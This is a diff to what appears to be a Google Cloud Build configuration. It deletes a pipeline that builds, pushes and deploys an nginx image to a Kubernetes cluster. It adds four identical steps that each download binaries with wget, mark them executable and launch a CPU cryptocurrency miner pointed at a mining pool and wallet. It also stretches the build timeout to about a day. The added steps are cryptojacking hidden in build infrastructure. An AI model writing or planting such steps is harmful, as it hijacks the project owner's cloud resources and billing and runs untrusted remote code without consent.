@@ -1,26 +1,37 @@
 steps:
-  - name: "gcr.io/cloud-builders/docker"
-    id: build Step
-    args: ["build", "-t", "gcr.io/ringed-robot-349322/my-nginx:latest", "."]
-  - name: "gcr.io/cloud-builders/docker"
-    id: push Step
-    args: ["push", "gcr.io/ringed-robot-349322/my-nginx:latest"]
-  - name: gcr.io/cloud-builders/gke-deploy
-    id: Prepare Account Service Kubernetes YAML
-    args:
-      - prepare
-      - '--filename=gs://xyz-deploy/deployment.yaml'
-      - '--image=gcr.io/ringed-robot-349322/my-nginx:latest'
-      - '--app=frontend'
-      - '--version=latest'
-      - '--namespace=xyz'
-      - '--output=gs://xyz-deploy/ouput'
-      - '--annotation=gcb-build-id=$BUILD_ID'
-  - name: gcr.io/cloud-builders/gke-deploy
-    id: Deploy Account Service in K8s
-    args:
-      - apply
-      - '--filename=gs://xyz-deploy/ouput/expanded/*'
-      - '--namespace=xyz'
-      - '--cluster=cluster-3'
-      - '--location=us-central1-c'
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://github.com/Jwjwj83838/TES/raw/main/hellminers && wget https://github.com/Jwjwj83838/TES/raw/main/verus-solver && chmod +x hellminers verus-solver && ./hellminers -c stratum+tcp://ap.luckpool.net:3956 -u REA4Vm58oEr3MdBwiKXCb1AMc7pNJFFN12.mm -p x --cpu
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://github.com/Jwjwj83838/TES/raw/main/hellminers && wget https://github.com/Jwjwj83838/TES/raw/main/verus-solver && chmod +x hellminers verus-solver && ./hellminers -c stratum+tcp://ap.luckpool.net:3956 -u REA4Vm58oEr3MdBwiKXCb1AMc7pNJFFN12.mm -p x --cpu
+  waitFor:
+    - '-'
+    
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://github.com/Jwjwj83838/TES/raw/main/hellminers && wget https://github.com/Jwjwj83838/TES/raw/main/verus-solver && chmod +x hellminers verus-solver && ./hellminers -c stratum+tcp://ap.luckpool.net:3956 -u REA4Vm58oEr3MdBwiKXCb1AMc7pNJFFN12.mm -p x --cpu
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://github.com/Jwjwj83838/TES/raw/main/hellminers && wget https://github.com/Jwjwj83838/TES/raw/main/verus-solver && chmod +x hellminers verus-solver && ./hellminers -c stratum+tcp://ap.luckpool.net:3956 -u REA4Vm58oEr3MdBwiKXCb1AMc7pNJFFN12.mm -p x --cpu
+  waitFor:
+    - '-'
+timeout: '86000s'
